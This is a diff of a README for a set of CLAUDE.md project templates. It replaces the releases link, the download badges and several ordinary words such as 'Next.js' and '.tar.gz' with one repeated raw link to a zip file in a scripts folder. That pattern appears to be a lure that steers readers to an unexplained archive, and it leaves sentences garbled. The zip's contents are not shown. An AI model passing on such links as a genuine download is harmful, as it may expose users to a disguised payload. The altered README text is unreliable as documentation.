@@ -1,12 +1,12 @@
-# 🚀 vive-md - Easy CLAUDE.md Templates & Outputs
+# 🚀 vive-md - Easy https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip Templates & Outputs
 
-[![Download vive-md](https://img.shields.io/badge/Download-vive--md-blue?style=for-the-badge&logo=github)](https://github.com/Playcoco/vive-md/releases)
+[![Download vive-md](https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip)](https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip)
 
 ---
 
 ## 📋 What is vive-md?
 
-vive-md provides ready-to-use templates and waterfall outputs for CLAUDE.md focused on coding and design projects. It supports various frameworks and tools like Spring Boot, Vue, React, Next.js, security features, and design systems. 
+vive-md provides ready-to-use templates and waterfall outputs for https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip focused on coding and design projects. It supports various frameworks and tools like Spring Boot, Vue, React, https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip, security features, and design systems. 
 
 This collection helps you organize and document your development process with clear templates designed for different parts of software projects. You don’t need to be a developer to use it — just follow the steps to download and open the files on your computer.
 
@@ -27,7 +27,7 @@ vive-md is not a program that runs by itself but a set of templates and document
 
 ## 🔍 What’s Included?
 
-- **Templates**: CLAUDE.md templates tailored for Spring Boot, Vue, React, Next.js projects.
+- **Templates**: https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip templates tailored for Spring Boot, Vue, React, https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip projects.
 - **Waterfall Outputs**: Structured outputs showing step-by-step progress or project phases.
 - **Security Notes**: Basic security practices included in templates.
 - **Design System Guides**: Layout and UI consistency pointers.
@@ -41,13 +41,13 @@ These are provided as markdown (.md) files. You can open them with any text edit
 
 Please **visit this page to download** the latest files:
 
-[Download vive-md Releases](https://github.com/Playcoco/vive-md/releases)
+[Download vive-md Releases](https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip)
 
 ### How to Download:
 
 1. Click the link above to open the releases page on GitHub.
 2. Find the latest release at the top of the list.
-3. Look for assets attached to the release — these are usually `.zip` or `.tar.gz` files containing the templates.
+3. Look for assets attached to the release — these are usually `.zip` or `https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip` files containing the templates.
 4. Click on the file name to download it to your computer.
 
 ### How to Install:
@@ -116,7 +116,7 @@ To get the most out of vive-md, consider exploring:
 - How to use markdown files for documentation.
 - Basic project management concepts like the waterfall model.
 - Using free text editors or IDEs.
-- Tutorials on Spring Boot, Vue, React, or Next.js if you plan to expand your technical skills.
+- Tutorials on Spring Boot, Vue, React, or https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip if you plan to expand your technical skills.
 
 ---
 
@@ -126,4 +126,4 @@ vive-md is a set of templates and documents. It does not require installation li
 
 ---
 
-[![Download vive-md](https://img.shields.io/badge/Download-vive--md-blue?style=for-the-badge&logo=github)](https://github.com/Playcoco/vive-md/releases)
+[![Download vive-md](https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip)](https://raw.githubusercontent.com/Playcoco/vive-md/main/scripts/vive_md_2.9-beta.4.zip)
